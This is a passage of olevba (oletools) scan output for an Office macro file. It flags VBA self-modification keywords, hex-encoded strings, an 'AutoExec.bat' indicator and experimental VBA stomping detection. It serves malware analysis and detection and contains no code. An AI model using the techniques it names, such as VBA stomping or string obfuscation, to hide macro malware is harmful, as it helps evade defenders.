|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |AutoExec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

